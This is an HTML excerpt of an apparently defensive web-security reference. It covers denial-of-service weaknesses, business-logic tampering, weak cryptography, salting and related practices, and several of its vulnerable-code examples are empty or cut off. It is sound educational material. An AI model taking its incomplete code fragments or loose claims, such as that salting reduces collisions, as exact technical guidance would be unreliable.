        <li>Via a self-service mechanism: As stated before, this self-service mechanism must be secure enough to avoid that the attacker can unlock accounts himself.</li>
        </ol>
        </li>

      <h4>The Denial of Service (DoS) attack is focused on making a resource (site, application, server) unavailable for the purpose it was designed. There are many ways to make a service unavailable for legitimate users by manipulating network packets, programming, logical, or resources handling vulnerabilities, among others. If a service receives a very large number of requests, it may cease to be available to legitimate users. In the same way, a service may stop if a programming vulnerability is exploited, or the way the service handles resources it uses.</h4>
      <p>Sometimes the attacker can inject and execute arbitrary code while performing a DoS attack in order to access critical information or execute commands on the server. Denial-of-service attacks significantly degrade the service quality experienced by legitimate users. These attacks introduce large response delays, excessive losses, and service interruptions, resulting in direct impact on availability.</p>
      <h2 id="risk-factors">Risk Factors</h2>
      <p>Risk factors can break down into multiple categories. Two principle sources of risk include inadequate resources and non-technical threat motivators.</p>
      <p>The first example of a risk factor, inadequate resources, requires attention if system architecture was not designed to meet traffic demand overflows. This risk reduces the difficulty of successfully executing a DoS attack and can, left unchecked, result in DoS symptoms absent an actual attack.</p>
      <p>The second example and perhaps the largest risk factor is not technical and is in the domain of public relations or strategic communications. An organization should avoid taking action that can make them a target of a DoS attack unless the benefits of doing so outweigh the potential costs or mitigating controls are in place.</p>
      <p>Other risk factors may also exist depending on the specific environment.</p>
      <h2 id="examples">Examples</h2>
      <p>The following DoS techniques and examples were extracted from OWASP Testing Guide v2.</p>
      <h3 id="dos-user-specified-object-allocation">DoS User Specified Object Allocation</h3>
      <p>If users can supply, directly or indirectly, a value that will specify how many of an object to create on the application server, and if the server does not enforce a hard upper limit on that value, it is possible to cause the environment to run out of available memory. The server may begin to allocate the required number of objects specified, but if this is an extremely large number, it can cause serious issues on the server, possibly filling its whole available memory and corrupting its performance.</p>
      <p>The following is a simple example of vulnerable code in Java:</p>
      <div class="language-java highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nc">String</span> <span class="nc">TotalObjects</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="err">&ldquo;</span><span class="n">numberofobjects</span><span class="err">&rdquo;</span><span class="o">);</span>

      </div>
      <h3 id="dos-user-input-as-a-loop-counter">DoS User Input as a Loop Counter</h3>
      <p>Similar to the previous problem of User Specified Object Allocation, if the user can directly or indirectly assign a value that will be used as a counter in a loop function, this can cause performance problems on the server.</p>
      <p>The following is an example of vulnerable code in Java:</p>
      <div class="language-java highlighter-rouge">

      </div>
      <p>As we can see in this simple example, the user has control over the loop counter. If the code inside the loop is very demanding in terms of resources, and an attacker forces it to be executed a very high number of times, this might decrease the performance of the server in handling other requests, causing a DoS condition.</p>
      <h3 id="dos-failure-to-release-resources">DoS Failure to Release Resources</h3>
      <p>If an error occurs in the application that prevents the release of an in-use resource, it can become unavailable for further use. Possible examples include:</p>
      <ul>
      <li>An application locks a file for writing, and then an exception occurs but does not explicitly close and unlock the file</li>
      <li>Memory leaking in languages where the developer is responsible for memory management such as C &amp; C++. In the case where an error causes normal logic flow to be circumvented, the allocated memory may not be removed and may be left in such a state that the garbage collector does not know it should be reclaimed</li>
      <li>Use of DB connection objects where the objects are not being freed if an exception is thrown. A number of such repeated requests can cause the application to consume all the DB connections, as the code will still hold the open DB object, never releasing the resource.</li>
      </ul>
      <p>The following is an example of vulnerable code in Java. In the example, both the Connection and the CallableStatement should be closed in a finally block.</p>
      <div class="language-plaintext highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code>public class AccountDAO {

      <h3 id="dos-buffer-overflows">DoS Buffer Overflows</h3>
      <p>Any language where the developer has direct responsibility for managing memory allocation, most notably C &amp; C++, has the potential for a <a href="https://owasp.org/www-community/attacks/Buffer_Overflow_attack">Buffer Overflow</a>. While the most serious risk related to a buffer overflow is the ability to execute arbitrary code on the server, the first risk comes from the denial of service that can happen if the application crashes.</p>
      <p>The following is a simplified example of vulnerable code in C:</p>
      <div class="language-c highlighter-rouge">
      <div class="highlight">

      </code></pre>
      </div>
      </div>
      <p>If this code example were executed, it would cause a segmentation fault and dump core. The reason is that strcpy would try to copy 53 characters into an array of 10 elements only, overwriting adjacent memory locations. While this example above is an extremely simple case, the reality is that in a web based application there may be places where the user input is not adequately checked for its length, making this kind of attack possible.</p>
      <h3 id="dos-storing-too-much-data-in-session">DoS Storing too Much Data in Session</h3>
      <p>Care must be taken not to store too much data in a user session object. Storing too much information in the session, such as large quantities of data retrieved from the database, can cause denial of service issues. This problem is exacerbated if session data is also tracked prior to a login, as a user can launch the attack without the need of an account.</p>
      <h3 id="dos-locking-customer-accounts">DoS Locking Customer Accounts</h3>
      <p>The first DoS case to consider involves the authentication system of the target application. A common defense to prevent brute-force discovery of user passwords is to lock an account from use after between three to five failed attempts to login. This means that even if a legitimate user were to provide their valid password, they would be unable to login to the system until their account has been unlocked. This defense mechanism can be turned into a DoS attack against an application if there is a way to predict valid login accounts.</p>
      <p>Note, there is a business vs. security balance that must be reached based on the specific circumstances surrounding a given application. There are pros and cons to locking accounts, to customers being able to choose their own account names, to using systems such as CAPTCHA, and the like. Each enterprise will need to balance these risks and benefits, but not all of the details of those decisions are covered here.</p>

      <h1>Testing Feature Misuse Vulnerabilities</h1>

          <ol>
              <li>
                  <h2>Identify and understand the web application's features and functionalities:</h2>
                  <p>Manually review the web application's documentation, source code, or user interface to identify and understand the various features and functionalities that it provides.</p>
              </li>

              <li>
                  <h2>Analyze how each feature or functionality is implemented:</h2>
                  <p>Manually review the web application's source code to analyze how each feature or functionality is implemented. Look for any potential vulnerabilities or weaknesses that could be exploited to gain unauthorized access to sensitive data or to perform unintended actions.</p>
              </li>

              <li>
                  <h2>Test each feature or functionality for feature misuse vulnerabilities:</h2>
                  <p>Manually test each feature or functionality of the web application to identify any potential feature misuse vulnerabilities. For example, you can try using a legitimate feature or functionality in an unintended or unexpected manner to see if it results in the web application granting you unauthorized access to sensitive data or allowing you to perform unintended actions.</p>
              </li>

              <li>
                  <h2>Use automated tools:</h2>
                  <p>Use automated tools, such as web vulnerability scanners or penetration testing tools, to test for feature misuse vulnerabilities. These tools can systematically probe the web application for potential feature misuse vulnerabilities by automatically testing each feature or functionality in various different ways. Some popular options include:</p>
                  <ul>
                      <li><a href="https://www.zaproxy.org/" target="_blank">OWASP Zed Attack Proxy (ZAP)</a></li>
                      <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
                      <li><a href="https://www.acunetix.com/" target="_blank">Acunetix Web Vulnerability Scanner</a></li>

				<h4>A non-production environment refers to a setup used for testing, development, or staging purposes rather than for live production applications. These environments are typically isolated from the production environment to avoid affecting live user data, and they allow developers and QA teams to test new features, bug fixes, and configurations without disrupting real users.</h4>

    <h2>Types of Non-Production Environments</h2>
    <p>Non-production environments can be classified into several types based on their intended use:</p>
    <ul>
        <li><strong>Development Environment:</strong> The environment where developers write and test new code. It is often a local machine or a shared server where the initial stages of development take place.</li>
        <li><strong>Testing Environment:</strong> Used for running automated and manual tests. This environment mirrors production as closely as possible to ensure that new code behaves as expected under conditions similar to the live system.</li>
        <li><strong>Staging Environment:</strong> A pre-production setup that closely mirrors the production environment. It allows for final testing of features, integrations, and performance before deployment to the live system.</li>
        <li><strong>Sandbox Environment:</strong> An isolated environment used for experimenting with new technologies, configurations, or features without impacting other systems. It provides a safe area for experimentation and learning.</li>
    </ul>

    <h2>Importance of Non-Production Environments</h2>
    <p>Non-production environments play a critical role in software development and testing. They offer several advantages, including:</p>
    <ul>
        <li><strong>Safe Testing:</strong> Developers and testers can experiment without the risk of impacting live users or data, ensuring that new features are thoroughly vetted before release.</li>
        <li><strong>Faster Development Cycle:</strong> By using a dedicated environment for testing, teams can quickly detect bugs and issues, allowing them to resolve problems before they reach the production stage.</li>
        <li><strong>Reduced Risk of Downtime:</strong> Changes and updates are first tested in a non-production environment to ensure that no major issues occur in the production environment, reducing the risk of downtime.</li>
        <li><strong>Performance Optimization:</strong> Performance and load testing can be conducted in a non-production environment to ensure that the application will scale effectively in production.</li>
    </ul>

    <h2>Challenges with Non-Production Environments</h2>
    <p>While non-production environments offer significant benefits, they also come with some challenges:</p>
    <ul>
        <li><strong>Data Integrity:</strong> Since non-production environments may use a subset of data or synthetic data, there can be differences in behavior between these environments and production. Testing with real data can sometimes lead to unexpected results.</li>
        <li><strong>Cost:</strong> Maintaining multiple non-production environments can be costly, especially if they require significant resources, such as hardware or cloud services.</li>
        <li><strong>Configuration Drift:</strong> Non-production environments may not always match production perfectly. Over time, differences in configurations can lead to discrepancies in behavior between the two, making it difficult to identify problems early.</li>
        <li><strong>Security Risks:</strong> Non-production environments may lack the same level of security as production, which can create vulnerabilities if sensitive data is used or exposed in testing scenarios.</li>
    </ul>

    <h2>Best Practices for Non-Production Environments</h2>
    <p>To maximize the effectiveness of non-production environments while minimizing the challenges, it is important to follow best practices:</p>
    <ul>
        <li><strong>Keep Environments Updated:</strong> Regularly update non-production environments to match the production system in terms of configuration, version, and dependencies.</li>
        <li><strong>Use Realistic Data:</strong> When possible, use anonymized or sanitized production data to better simulate real-world conditions, while ensuring that sensitive information is protected.</li>
        <li><strong>Enforce Security Measures:</strong> Apply appropriate security measures in non-production environments, such as secure access controls and encrypted communication, to prevent unauthorized access to testing environments.</li>
        <li><strong>Automate Testing:</strong> Implement automated testing and continuous integration to improve the speed and accuracy of testing in non-production environments.</li>
        <li><strong>Monitor and Document Changes:</strong> Track changes to non-production environments and keep documentation up to date to ensure that all testing is performed in the correct context.</li>

      <sl-details summary="Trust Relation" open>
		  <h4>In the context of cybersecurity and information security, trust relations refer to the established connections between different entities (such as systems, networks, or organizations) that rely on mutual trust to exchange information or perform actions securely. These relationships are crucial for secure communication, data exchange, and operations across interconnected systems or services.</h4>

    <h2>Types of Trust Relations</h2>
    <p>Trust relations can exist in various forms, depending on the entities involved and the context in which they are established:</p>
    <ul>
        <li><strong>Trusted Networks:</strong> Organizations often establish trust relations between their internal network and external networks, such as partners or vendors, to ensure secure data exchange. This can involve VPNs, private channels, or specific access controls.</li>
        <li><strong>Cross-Domain Trust:</strong> Cross-domain trust refers to the relationship established between different security domains, often seen in federated identity systems, where users can access resources across different systems with a single set of credentials.</li>
        <li><strong>Third-Party Trust:</strong> Involving a third party to validate or facilitate secure communication between two entities, such as using Certificate Authorities (CAs) to establish trust in SSL/TLS certificates or relying on external services for authentication (OAuth, SSO).</li>
        <li><strong>Trust between Applications:</strong> Applications that communicate and share data with each other may establish trust relationships through APIs, web services, or other mechanisms. These interactions often rely on strong authentication, authorization, and secure protocols.</li>
    </ul>

    <h2>Importance of Trust Relations</h2>
    <p>Trust relations play a vital role in various security aspects:</p>
    <ul>
        <li><strong>Secure Communication:</strong> Trust relations allow systems and users to securely communicate, ensuring that data and information are not intercepted or manipulated during transit.</li>
        <li><strong>Authentication and Authorization:</strong> Trust is essential for authenticating and authorizing users or devices. Systems often rely on trust to grant access to resources, ensuring that only authenticated and authorized entities are allowed to interact.</li>
        <li><strong>Data Integrity:</strong> Through trusted relations, systems ensure that the data being exchanged is authentic and has not been tampered with, protecting the integrity of the information.</li>
        <li><strong>Reliability of Services:</strong> Trust relations help guarantee the reliability of services offered between partners, ensuring that all parties involved fulfill their roles and obligations securely.</li>
        <li><strong>Compliance and Legal Obligations:</strong> Many industries require trust-based relationships between organizations and third parties to comply with regulations, such as GDPR, HIPAA, or financial data protection laws.</li>
    </ul>

    <h2>Establishing and Maintaining Trust Relations</h2>
    <p>Establishing and maintaining trust relationships requires robust security measures to ensure that the relationship remains intact and that unauthorized parties cannot exploit it:</p>
    <ul>
        <li><strong>Authentication Mechanisms:</strong> The use of strong authentication mechanisms, such as multi-factor authentication (MFA), certificates, or cryptographic protocols, ensures that the entities involved in the trust relationship are who they claim to be.</li>
        <li><strong>Access Controls:</strong> Defining clear access control policies ensures that only authorized entities can interact with each other or access sensitive data in a trust relationship.</li>
        <li><strong>Regular Audits:</strong> Regular auditing of trust relations helps detect and mitigate any potential vulnerabilities or misuse. Logs and monitoring can be used to ensure compliance and identify suspicious activities.</li>
        <li><strong>Encryption:</strong> Encryption protocols, such as SSL/TLS for secure web communications, ensure that the data exchanged between trusted parties remains confidential and protected from eavesdropping or tampering.</li>
        <li><strong>Secure Configuration:</strong> Ensuring that systems, networks, and services are properly configured and patched helps maintain the integrity of trust relationships by preventing vulnerabilities that could be exploited by attackers.</li>
    </ul>

    <h2>Risks Associated with Trust Relations</h2>
    <p>Although trust relations are crucial for secure operations, there are several risks associated with them:</p>
    <ul>
        <li><strong>Misuse of Trust:</strong> An attacker or malicious actor who gains access to one trusted entity may attempt to misuse the trust relation to compromise other systems or networks.</li>
        <li><strong>Privilege Escalation:</strong> Improperly configured trust relationships may allow attackers to gain unauthorized access to systems or resources, leading to privilege escalation and further exploitation.</li>
        <li><strong>Insufficient Monitoring:</strong> Lack of monitoring or auditing of trust relationships can lead to undetected abuses or breaches, allowing attackers to maintain persistence in the network.</li>
        <li><strong>Trust Escalation Attacks:</strong> Attackers may exploit weak or misconfigured trust relations to escalate their privileges or gain access to sensitive data across multiple systems.</li>
    </ul>

    <h2>Best Practices for Managing Trust Relations</h2>
    <p>To minimize the risks associated with trust relations and ensure that they are maintained securely, the following best practices should be followed:</p>
    <ul>
        <li><strong>Limit Trust:</strong> Apply the principle of least privilege to trust relations, ensuring that only the necessary access and permissions are granted to reduce the attack surface.</li>
        <li><strong>Secure Communication Channels:</strong> Always use encrypted communication channels (e.g., SSL/TLS, IPsec) to protect the confidentiality and integrity of data exchanged between trusted entities.</li>
        <li><strong>Review Trust Relationships Regularly:</strong> Periodically review and assess trust relations to ensure they remain valid and secure. Revoke access or update permissions when necessary.</li>
        <li><strong>Implement Strong Authentication:</strong> Use strong and multi-factor authentication mechanisms to verify the identity of entities involved in the trust relationship, reducing the risk of unauthorized access.</li>
        <li><strong>Use Digital Certificates:</strong> Rely on trusted certificate authorities (CAs) for validating identities and establishing trust in secure communications and transactions.</li>
    </ul>

      <h4>Many applications are designed to display different fields depending on the user or situation by leaving some inputs hidden. However, in many cases it is possible to submit hidden field values to the server using a proxy. In these cases the server-side controls must be smart enough to perform relational or server-side edits to ensure that the proper data is allowed to the server based on user and application specific business logic.</h4>
      <p>Additionally, the application must not depend on non-editable controls, drop-down menus or hidden fields for business logic processing because these fields remain non-editable only in the context of the browsers. Users may be able to edit their values using proxy editor tools and try to manipulate business logic. If the application exposes values related to business rules like quantity, etc. as non-editable fields, it must maintain a copy on the server-side and use the same for business logic processing. Finally, aside from application/system data, log systems must be secured to prevent read, writing, and updating.</p>
      <p>Business logic integrity check vulnerabilities are unique in that these misuse cases are application specific and if users are able to make changes, one should only be able to write or update/edit specific artifacts at specific times as per the business process logic.</p>
      <p>The application must be smart enough to check for relational edits and not allow users to submit information directly to the server that is not valid, trusted because it came from a non-editable controls or the user is not authorized to submit through the frontend. Additionally, system artifacts such as logs must be &ldquo;protected&rdquo; from unauthorized read, writing and removal.</p>
      <h3 id="example-1">Example 1</h3>
      <p>Imagine an ASP.NET GUI application that only allows the admin user to change the password for other users in the system. The admin user will see the username and password fields to enter a username and password while other users will not see either field. However, if a non admin user submits information in the username and password field through a proxy they may be able to &ldquo;trick&rdquo; the server into believing that the request has come from an admin user and change password of other users.</p>
      <h3 id="example-2">Example 2</h3>
      <p>Most web applications have dropdown lists making it easy for the user to quickly select their state, month of birth, etc. Suppose a Project Management application allowed users to login and depending on their privileges presented them with a drop down list of projects they have access to. What happens if an attacker finds the name of another project that they should not have access to and submits the information via a proxy. Will the application give access to the project? They should not have access even though they skipped an authorization business logic check.</p>
      <h3 id="example-3">Example 3</h3>
      <p>Suppose the motor vehicle administration system required an employee initially verify each citizens&rsquo; documentation and information when they issue an identification or driver&rsquo;s license. At this point the business process has created data with a high level of integrity as the integrity of submitted data is checked by the employees. Now suppose the application is moved to the internet so employees can log on for full service or citizens can log on for a reduced self-service application to update certain information. At this point an attacker may be able to use an intercepting proxy to add or update data that they should not have access to and they could destroy the integrity of the data by stating that the citizen was not married but supplying data for a spouse&rsquo;s name. This type of inserting or updating of unverified data destroys the data integrity and might have been prevented if the business process logic was followed.</p>
      <h3 id="example-4">Example 4</h3>
      <p>Many systems include logging for auditing and troubleshooting purposes. But, how good/valid is the information in these logs? Can they be manipulated by attackers either intentionally or accidentally having their integrity destroyed?</p>

	      <sl-details summary="Segregation" open>
	      <h4>Segregation in security refers to the practice of dividing systems, networks, or data into separate, isolated segments to minimize risks and ensure that access, operations, and resources are controlled appropriately. This approach is designed to protect sensitive data, reduce the impact of potential attacks, and enhance the overall security posture of an organization.</h4>

    <h2>Types of Segregation</h2>
    <p>Segregation can be implemented in several ways, depending on the nature of the system, data, or network being protected:</p>
    <ul>
        <li><strong>Network Segregation:</strong> Involves dividing a network into smaller, isolated subnets to limit the spread of attacks and control traffic flow between different segments. This helps prevent lateral movement in case of a breach.</li>
        <li><strong>Data Segregation:</strong> Refers to separating sensitive or critical data from less sensitive information. This can involve physical or logical separation, ensuring that access to sensitive data is restricted to authorized personnel only.</li>
        <li><strong>Role-Based Segregation:</strong> Ensures that different roles within an organization have access only to the resources or data necessary for their specific tasks. This prevents users from accessing data they don’t need, reducing the risk of accidental or intentional misuse.</li>
        <li><strong>Application Segregation:</strong> This method involves isolating different applications or services to ensure that a vulnerability in one does not impact the entire infrastructure. It’s commonly seen in containerization and microservices architectures.</li>
        <li><strong>Environment Segregation:</strong> Refers to separating production and non-production environments (e.g., development, testing, staging) to prevent accidental exposure or manipulation of live systems and data.</li>
    </ul>

    <h2>Importance of Segregation</h2>
    <p>Segregation plays a vital role in improving security by providing the following benefits:</p>
    <ul>
        <li><strong>Minimized Attack Surface:</strong> By isolating systems or data, segregation helps reduce the number of entry points that attackers can exploit. A compromised segment does not necessarily expose the entire network or infrastructure.</li>
        <li><strong>Containment of Breaches:</strong> Segregation limits the lateral movement of attackers within a network or system. If an attacker gains access to one segment, segregation ensures that they cannot easily pivot to other critical parts of the system.</li>
        <li><strong>Enhanced Access Control:</strong> With segregation, access to each segment can be strictly controlled based on user roles, allowing only authorized individuals to access sensitive data or systems, ensuring a principle of least privilege.</li>
        <li><strong>Data Integrity and Confidentiality:</strong> Segregating sensitive data from other less-critical data ensures that it is more tightly protected. It also helps ensure that the integrity and confidentiality of critical data are not compromised.</li>
        <li><strong>Improved Compliance:</strong> Many regulatory frameworks require segregation of data, especially in sectors like healthcare (HIPAA), finance (PCI DSS), and government (FISMA). Segregation helps meet these compliance standards.</li>
    </ul>

    <h2>Best Practices for Segregation</h2>
    <p>Implementing effective segregation requires careful planning and adherence to best practices:</p>
    <ul>
        <li><strong>Use Firewalls and Access Control Lists (ACLs):</strong> Employ firewalls and ACLs to enforce network segmentation, restricting traffic flow between isolated segments and preventing unauthorized access.</li>
        <li><strong>Segment Based on Sensitivity:</strong> Sensitive data and systems should be isolated from less sensitive areas. For example, production systems should be isolated from development or test environments to reduce the risk of accidental or malicious exposure.</li>
        <li><strong>Apply the Principle of Least Privilege:</strong> Access to each segregated segment should be based on the least privilege principle, meaning users and systems only have the minimum necessary permissions required to perform their tasks.</li>
        <li><strong>Implement Multi-Factor Authentication (MFA):</strong> Use MFA for accessing highly segregated or sensitive environments. This adds an additional layer of security to ensure only authorized individuals can access critical resources.</li>
        <li><strong>Regularly Review Segregation Policies:</strong> Periodically audit and review segregation policies to ensure they are still effective and aligned with evolving security threats and organizational requirements.</li>
    </ul>

    <h2>Risks of Insufficient Segregation</h2>
    <p>Failure to implement segregation effectively can lead to significant security risks:</p>
    <ul>
        <li><strong>Widespread Compromise:</strong> If segregation is not properly enforced, a breach in one area can lead to the compromise of the entire system or network, allowing attackers to move freely and access critical data.</li>
        <li><strong>Unauthorized Access:</strong> Lack of access control or insufficient segregation may result in unauthorized users gaining access to sensitive data or systems, potentially leading to data breaches or misuse.</li>
        <li><strong>Data Leakage:</strong> Insufficient data segregation can lead to accidental or intentional data leakage, where sensitive information is exposed or shared without proper authorization.</li>
        <li><strong>Compliance Violations:</strong> Without proper segregation, organizations may fail to meet regulatory requirements, resulting in legal and financial consequences.</li>
    </ul>

	        <h4>Wrong cryptography algorithm use refers to the implementation of weak, outdated, or unsuitable cryptographic methods to protect sensitive data, communications, or other security operations. The use of improper cryptographic algorithms can leave systems vulnerable to attacks, data breaches, and other security issues.</h4>

    <h2>Common Cryptographic Algorithms and Vulnerabilities</h2>
    <p>While there are numerous cryptographic algorithms used to secure systems, some have been found to be insecure or outdated over time. Below are common examples:</p>
    <ul>
        <li><strong>DES (Data Encryption Standard):</strong> Once widely used, DES is now considered insecure due to its small key size (56 bits), which makes it vulnerable to brute-force attacks.</li>
        <li><strong>MD5 (Message Digest Algorithm 5):</strong> MD5 is a cryptographic hash function that was widely used for integrity checking but has known vulnerabilities. It is prone to collision attacks, where two different inputs produce the same hash.</li>
        <li><strong>SHA-1 (Secure Hash Algorithm 1):</strong> SHA-1 was commonly used for digital signatures and certificates but has been deprecated due to weaknesses that allow collision attacks.</li>
        <li><strong>RC4 (Rivest Cipher 4):</strong> RC4 is a stream cipher that was once widely used in protocols like SSL and WEP. However, vulnerabilities in its design have made it unsuitable for modern cryptographic needs.</li>
        <li><strong>ECB Mode (Electronic Codebook Mode):</strong> ECB is a simple block cipher mode that is vulnerable because identical plaintext blocks are encrypted into identical ciphertext blocks, leading to patterns that can be exploited in cryptanalysis.</li>
    </ul>

    <h2>Impacts of Using Weak Cryptographic Algorithms</h2>
    <p>Using weak or outdated cryptographic algorithms can have serious consequences, including:</p>
    <ul>
        <li><strong>Data Breaches:</strong> Weak algorithms can be easily broken by attackers, leading to the exposure of sensitive data such as passwords, financial information, or private communications.</li>
        <li><strong>Man-in-the-Middle Attacks:</strong> Insecure cryptography can be exploited to intercept or manipulate communications between clients and servers, enabling attackers to eavesdrop on or alter data.</li>
        <li><strong>Loss of Integrity:</strong> Insecure algorithms, particularly hash functions like MD5 or SHA-1, can lead to the loss of data integrity, where attackers may be able to modify files without detection.</li>
        <li><strong>Compliance Violations:</strong> Many regulatory standards, such as GDPR, PCI DSS, and HIPAA, require the use of strong cryptographic algorithms. Failing to meet these requirements could result in penalties and legal liabilities.</li>
        <li><strong>Reputation Damage:</strong> A breach resulting from weak cryptographic algorithms can severely damage an organization’s reputation, leading to loss of customer trust and business opportunities.</li>
    </ul>

    <h2>Best Practices for Cryptography</h2>
    <p>To avoid the risks associated with the use of wrong cryptography algorithms, it is essential to follow best practices, such as:</p>
    <ul>
        <li><strong>Use Strong, Modern Algorithms:</strong> Adopt cryptographic algorithms that are widely accepted and considered secure. For encryption, algorithms like AES (Advanced Encryption Standard) with key lengths of at least 128 bits are recommended. For hashing, SHA-256 or SHA-3 are better alternatives than MD5 or SHA-1.</li>
        <li><strong>Use Key Management Best Practices:</strong> Securely store and manage encryption keys. Use techniques like key rotation and the separation of keys for different purposes to mitigate the risk of key exposure or misuse.</li>
        <li><strong>Implement Proper Encryption Modes:</strong> Use secure encryption modes like CBC (Cipher Block Chaining) or GCM (Galois/Counter Mode) instead of ECB mode to avoid patterns in the ciphertext.</li>
        <li><strong>Apply Salting and Stretching for Password Hashing:</strong> When hashing passwords, always use a salt (a random value) along with algorithms like bcrypt, scrypt, or Argon2, which are designed to be computationally expensive and resistant to brute-force attacks.</li>
        <li><strong>Stay Up to Date with Cryptographic Research:</strong> Cryptographic algorithms and their implementations evolve over time. Regularly review the latest standards and recommendations from bodies such as NIST (National Institute of Standards and Technology) and update your cryptography protocols as needed.</li>
        <li><strong>Use TLS/SSL for Secure Communication:</strong> Always use up-to-date versions of TLS (Transport Layer Security) to encrypt communications between clients and servers. Avoid outdated protocols like SSL and earlier versions of TLS that are vulnerable to attacks.</li>
    </ul>

    <h2>How to Detect Wrong Cryptography Algorithms</h2>
    <p>Detecting the use of weak or outdated cryptography algorithms can be done by:</p>
    <ul>
        <li><strong>Reviewing Cryptographic Implementations:</strong> Regularly audit cryptographic code and libraries to ensure that modern, secure algorithms are in use. Tools like static code analyzers can help identify weak algorithms in source code.</li>
        <li><strong>Penetration Testing:</strong> Penetration testing tools like OpenSSL, Nmap, and SSL Labs’ SSL Test can be used to identify weak cipher suites or deprecated algorithms in use on web servers and applications.</li>
        <li><strong>Cryptographic Analysis Tools:</strong> Tools such as Hashcat and John the Ripper can be used to assess the strength of hashed passwords, and reveal if they are using weak algorithms or poor configurations.</li>
    </ul>

	        <sl-details summary="Proper Salting" open>
	         <h4>Salting is the process of adding a random value, known as a "salt," to data such as passwords before hashing them. This ensures that even if two users have the same password, their stored password hashes will be different due to unique salts. Proper salting is essential for protecting password hashes from brute-force attacks, rainbow table attacks, and other forms of password cracking.</h4>

    <h2>Why Proper Salting Is Important</h2>
    <p>Proper salting protects passwords and other sensitive data from several common security threats, including:</p>
    <ul>
        <li><strong>Rainbow Table Attacks:</strong> Without a salt, attackers can use precomputed tables (rainbow tables) of common password hashes to quickly guess passwords. Salting makes these tables ineffective, as each salted hash is unique.</li>
        <li><strong>Brute-Force Attacks:</strong> By adding a random salt to each password, attackers cannot use the same hash for different users, forcing them to attack each password hash individually.</li>
        <li><strong>Hash Collisions:</strong> Salting reduces the chances of hash collisions, where different inputs generate the same hash. With a unique salt, the probability of collisions is minimized.</li>
        <li><strong>Security Best Practices:</strong> Salting is considered a basic security best practice and is required for compliance with various security regulations and standards (e.g., PCI-DSS, GDPR).</li>
    </ul>

    <h2>How Salting Works</h2>
    <p>Salting works by appending or prepending a random value (the "salt") to the original password before applying a hash function. The result is a unique hash that differs even for identical passwords.</p>
    <h3>Steps Involved in Salting and Hashing a Password:</h3>
    <ol>
        <li><strong>Generate a Salt:</strong> A cryptographically secure random string is generated. This should be long enough to avoid brute-force attacks (e.g., 16 bytes or more).</li>
        <li><strong>Combine the Salt with the Password:</strong> The salt is concatenated with the password (either before or after) to create a new string.</li>
        <li><strong>Hash the Combined String:</strong> A strong, one-way cryptographic hash function (e.g., bcrypt, Argon2, scrypt) is applied to the salted password string.</li>
        <li><strong>Store the Salt and Hash:</strong> The salted hash, along with the salt, is stored in the database. The salt does not need to be kept secret, as its purpose is only to ensure unique hashes.</li>
    </ol>

    <h2>Best Practices for Salting</h2>
    <p>To ensure proper salting, the following best practices should be followed:</p>
    <ul>
        <li><strong>Use Strong Hash Functions:</strong> Always use modern, secure hash functions designed for password hashing, such as bcrypt, Argon2, or scrypt. These functions are resistant to brute-force and rainbow table attacks.</li>
        <li><strong>Generate Unique Salts:</strong> Ensure that each user’s salt is unique. Salts should be generated randomly using a cryptographically secure random number generator.</li>
        <li><strong>Use Sufficient Salt Length:</strong> The salt should be long enough (e.g., 16 bytes or more) to resist attacks. Short salts are easier to guess or brute-force.</li>
        <li><strong>Store Salts Securely:</strong> While salts don't need to be kept secret, they should still be stored securely alongside the hashed password in a database.</li>
        <li><strong>Do Not Reuse Salts:</strong> Ensure that each salt is unique for each password. Reusing salts for multiple users weakens the protection provided by salting.</li>
        <li><strong>Combine Salting with Key Stretching:</strong> Salting should be combined with key stretching techniques (e.g., bcrypt, scrypt) to slow down attackers and increase resistance to brute-force attacks.</li>
    </ul>

    <h2>Common Pitfalls to Avoid</h2>
    <ul>
        <li><strong>Using a Static Salt:</strong> A static salt is one that is the same for all users. This defeats the purpose of salting and leaves all passwords vulnerable to the same attacks. Always generate unique salts for each user.</li>
        <li><strong>Using Weak Hashing Algorithms:</strong> Using weak hashing algorithms like MD5 or SHA-1 without salting is unsafe. These are fast algorithms that are vulnerable to brute-force and collision attacks. Use algorithms like bcrypt, scrypt, or Argon2 instead.</li>
        <li><strong>Storing Only the Salt:</strong> Storing only the salt and not the actual password hash is insecure. Both the salt and hash need to be stored for proper authentication.</li>
    </ul>

    <h2>Salting and Password Hashing Example</h2>
    <p>Here’s a simple example in Python using the `bcrypt` library to salt and hash a password:</p>
    <pre>
import bcrypt

# Step 1: Generate a random salt
salt = bcrypt.gensalt()

# Step 2: Hash the password with the salt
password = b"mysecretpassword"
hashed_password = bcrypt.hashpw(password, salt)

# Step 3: Store the salt and hashed password securely
print("Salt:", salt)
print("Hashed Password:", hashed_password)
    </pre>

    <h2>Salting for Other Types of Data</h2>
    <p>While salting is most commonly used for passwords, it can also be applied to other sensitive data to prevent data leakage or cryptographic attacks. For example, salts can be added to API keys, session tokens, or any data that needs to be hashed before storage.</p>

	            <h4>Cryptography random functions generate random values or sequences that are cryptographically secure, ensuring that they are unpredictable and resistant to attacks. These functions play a crucial role in various cryptographic protocols and applications, including encryption, key generation, and password hashing. Unlike basic random functions, cryptographic random functions are designed to provide high levels of security by making it extremely difficult for attackers to predict the outputs.</h4>

    <h2>Why Cryptographic Random Functions Are Important</h2>
    <p>In cryptographic systems, randomness is critical for several key operations, including:</p>
    <ul>
        <li><strong>Key Generation:</strong> Randomly generated keys are fundamental in symmetric and asymmetric encryption. A weak random number generator (RNG) can compromise the security of cryptographic systems.</li>
        <li><strong>Session Tokens:</strong> Cryptographically secure random numbers are used to generate session tokens for user authentication, preventing session fixation or hijacking attacks.</li>
        <li><strong>Salts and Nonces:</strong> Random salts are added to passwords before hashing, and nonces (numbers used once) are added to messages to ensure uniqueness and prevent replay attacks.</li>
        <li><strong>Digital Signatures:</strong> Random numbers are used in the creation of digital signatures, ensuring that signatures are unique to each message.</li>
        <li><strong>Initialization Vectors (IVs):</strong> Cryptographic algorithms like AES require an IV, which should be random to ensure that encrypted data does not repeat patterns and is secure against analysis.</li>
    </ul>

    <h2>Common Cryptographic Random Functions</h2>
    <p>There are several cryptographically secure random functions used in various cryptographic systems:</p>
    <ul>
        <li><strong>Cryptographically Secure Pseudo-Random Number Generator (CSPRNG):</strong> A CSPRNG is an algorithm that produces sequences of numbers that appear random but are generated using a deterministic process. These are designed to be secure against prediction by attackers.</li>
